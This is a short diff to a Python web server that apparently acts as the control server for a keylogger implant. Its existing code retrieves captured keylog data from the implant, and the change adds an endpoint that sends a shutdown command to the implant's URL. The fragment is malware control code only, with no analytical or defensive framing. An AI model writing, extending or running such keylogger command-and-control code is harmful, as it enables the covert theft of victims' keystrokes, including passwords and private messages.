@@ -46,6 +46,11 @@ def get_keylog_data():
     data = res.content
     return data
 
+@app.post('/shutdown')
+def send_shutdown_signal():
+    res = requests.post(urljoin(IMPLANT_URL, '/shutdown')).text
+    return res
+
 # Start app
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=9000)
